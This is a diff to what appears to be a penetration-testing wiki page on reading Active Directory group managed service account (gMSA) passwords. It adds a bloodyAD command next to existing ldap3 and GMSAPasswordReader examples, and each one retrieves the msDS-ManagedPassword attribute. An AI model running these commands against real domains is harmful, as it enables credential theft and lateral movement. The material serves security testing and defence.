@@ -39,6 +39,12 @@ connection.bind()
 connection.search(target_dn, '(&(ObjectClass=msDS-GroupManagedServiceAccount))', search_scope=ldap3.SUBTREE, attributes=['sAMAccountName','msDS-ManagedPassword'])
 print(connection.entries)
 ```
+
+**Alternative #3**: Using [bloodyAD](https://github.com/CravateRouge/bloodyAD)
+
+```bash
+bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get object $TargetObject --attr msDS-ManagedPassword
+```
 {% endtab %}
 
 {% tab title="Windows" %}
@@ -65,6 +71,7 @@ The second one relies on [GMSAPasswordReader](https://github.com/rvazarkar/GMSAP
 .\GMSAPasswordReader.exe --AccountName 'Target_Account'
 ```
 {% endtab %}
+
 {% endtabs %}
 
 ## Resources
